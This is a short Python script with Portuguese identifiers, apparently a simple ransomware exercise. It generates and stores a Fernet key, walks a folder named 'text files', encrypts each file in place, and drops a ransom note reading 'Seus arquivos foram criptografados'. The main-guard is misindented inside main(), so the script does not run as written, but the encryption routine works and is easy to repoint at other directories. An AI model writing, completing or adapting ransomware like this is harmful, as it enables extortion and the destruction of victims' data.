from cryptography.fernet import Fernet
import os 

def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave) 

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ramsomware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    with open("LEIA ISTO.txt","w") as f:   
        f.write("Seus arquivos foram criptografados")  


def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("text files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem_resgate()
    print("Ramsomware executado!")

    if __name__== "__main__":
        main()